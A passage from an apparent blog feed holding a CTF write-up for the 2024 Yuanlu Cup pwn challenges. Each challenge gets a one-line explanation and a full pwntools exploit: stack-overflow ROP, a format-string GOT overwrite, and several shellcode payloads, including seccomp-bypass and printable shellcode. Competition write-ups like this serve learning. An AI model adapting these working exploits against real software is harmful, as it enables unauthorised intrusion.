    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近比赛中遇到一道&lt;code&gt;llvm pass pwn&lt;/code&gt;，现学了一下相关知识，发现网上的讲解和例题的&lt;code&gt;exp&lt;/co</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="llvm" scheme="https://starrysky1004.github.io/tags/llvm/"/>
    
  </entry>
  
  <entry>
    <title>2024源鲁杯pwn方向题解</title>
    <link href="https://starrysky1004.github.io/2024/10/25/2024-yuan-lu-bei-pwn-fang-xiang-ti-jie/2024-yuan-lu-bei-pwn-fang-xiang-ti-jie/"/>
    <id>https://starrysky1004.github.io/2024/10/25/2024-yuan-lu-bei-pwn-fang-xiang-ti-jie/2024-yuan-lu-bei-pwn-fang-xiang-ti-jie/</id>
    <published>2024-10-25T08:41:16.000Z</published>
    <updated>2024-10-25T09:07:17.938Z</updated>
    
    <content type="html"><![CDATA[<h2 id="round1"><a href="#round1" class="headerlink" title="round1"></a>round1</h2><h3 id="canary-orw"><a href="#canary-orw" class="headerlink" title="canary_orw"></a>canary_orw</h3><p>再次运行到<code>vuln</code>使得<code>rsp</code>增加，最后<code>jmp rsp</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">46543</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>vuln <span class="token operator">=</span> <span class="token number">0x400821</span>pop_rbp_ret <span class="token operator">=</span> <span class="token number">0x40081E</span>jmp_rsp <span class="token operator">=</span> <span class="token number">0x40081B</span>check <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'__stack_chk_fail'</span><span class="token punctuation">]</span>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flag'</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x601100</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x601100</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'journey'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Sea'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>check<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'magic'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x40086D</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'go'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>check<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'magic'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>check<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'go'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>check<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'magic'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'go'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>jmp_rsp<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x90'</span> <span class="token operator">*</span> <span class="token number">0x30</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ezfmt"><a href="#ezfmt" class="headerlink" title="ezfmt"></a>ezfmt</h3><p>改<code>put_got</code>为<code>ogg</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">39131</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>vuln <span class="token operator">=</span> <span class="token number">0x4011FB</span>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>puts <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> <span class="token string">b'%13$p'</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc.so.6'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x24083</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0xe3afe</span><span class="token punctuation">,</span> <span class="token number">0xe3b01</span><span class="token punctuation">,</span> <span class="token number">0xe3b04</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseogg1 <span class="token operator">=</span> ogg <span class="token operator">&amp;</span> <span class="token number">0xff</span>ogg2 <span class="token operator">=</span> <span class="token punctuation">(</span>ogg<span class="token operator">>></span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffff</span>p <span class="token operator">=</span> <span class="token string">b'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ogg1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c%8$hhn'</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'%'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ogg2<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'c%8$hn'</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4011EF</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="giaopwn"><a href="#giaopwn" class="headerlink" title="giaopwn"></a>giaopwn</h3><p>栈溢出返回到后门</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">31413</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>code <span class="token operator">=</span> <span class="token number">0x601048</span>bd <span class="token operator">=</span> <span class="token number">0x4006D2</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400743</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bd<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'YL'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ezorw"><a href="#ezorw" class="headerlink" title="ezorw"></a>ezorw</h3><p>禁用了很多系统调用，用<code>openat</code>、<code>mmap</code>、<code>sendfile</code>代替</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">44021</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>shellcode<span class="token operator">=</span>shellcraft<span class="token punctuation">.</span>openat<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/flag'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>shellcode<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>mmap<span class="token punctuation">(</span><span class="token number">0x10000</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'eax'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>shellcode<span class="token operator">+=</span>shellcraft<span class="token punctuation">.</span>sendfile<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'orw'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ezstack"><a href="#ezstack" class="headerlink" title="ezstack"></a>ezstack</h3><p>字符绕过，用<code>$0</code>代替<code>sh</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">39602</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>bd <span class="token operator">=</span> <span class="token number">0x401275</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x38</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bd<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'stack'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'command'</span><span class="token punctuation">,</span> <span class="token string">b"$0\x00"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="msg-bot"><a href="#msg-bot" class="headerlink" title="msg_bot"></a>msg_bot</h3><p><code>protobuf</code>结构体逆向和可见字符<code>shellcode</code>，利用<code>32</code>位的<code>open</code>（即<code>64</code>位的<code>fstat</code>)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> bot_pb2 <span class="token keyword">import</span> Msgbot<span class="token keyword">import</span> grpccontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.yuanloo.com'</span><span class="token punctuation">,</span> <span class="token number">21231</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''push 0x66666963pop rsixor qword ptr [rax + 0x20], rsipush rbxpop rdixor al, 0x22push raxpop rsipush 0x66666963pop rdxpush rbxpop raxpush raxpush raxpush raxpush raxpush raxpush rax\x6c\x6c\x66\x66'''</span>msgcontent <span class="token operator">=</span> <span class="token string">b'\x68\x63\x69\x66\x66\x5e\x48\x31\x70\x20\x53\x5f\x34\x22\x50\x5e\x68\x63\x69\x66\x66\x5a\x53\x58'</span> <span class="token operator">+</span> <span class="token string">b'\x50'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\x6c\x6c\x66\x66'</span>msg <span class="token operator">=</span> Msgbot<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>msgid <span class="token operator">=</span> <span class="token number">0xC0DEFEED</span>msg<span class="token punctuation">.</span>msgsize <span class="token operator">=</span> <span class="token number">0xF00DFACE</span>msg<span class="token punctuation">.</span>msgcontent <span class="token operator">=</span> msgcontentserialized <span class="token operator">=</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'botmsg'</span><span class="token punctuation">,</span> serialized<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''mov  eax, 5push ecxpop  ebxmov  dword ptr [ecx], 0x6c662f2eadd  ecx, 4mov  dword ptr [ecx], 0x6761xor ecx, ecxxor edx, edxint  0x80'''</span>shellcode <span class="token operator">=</span> <span class="token string">b"\xb8\x05\x00\x00\x00\x51\x5b\xc7\x01\x2e\x2f\x66\x6c\x83\xc1\x04\xc7\x01\x61\x67\x00\x00\x31\xc9\x31\xd2\xcd\x80"</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="round2"><a href="#round2" class="headerlink" title="round2"></a>round2</h2><h3 id="ezstack2"><a href="#ezstack2" class="headerlink" title="ezstack2"></a>ezstack2</h3><p>栈溢出设置一参为<code>0x114514</code>之后直接劫持到<code>vuln</code>函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token 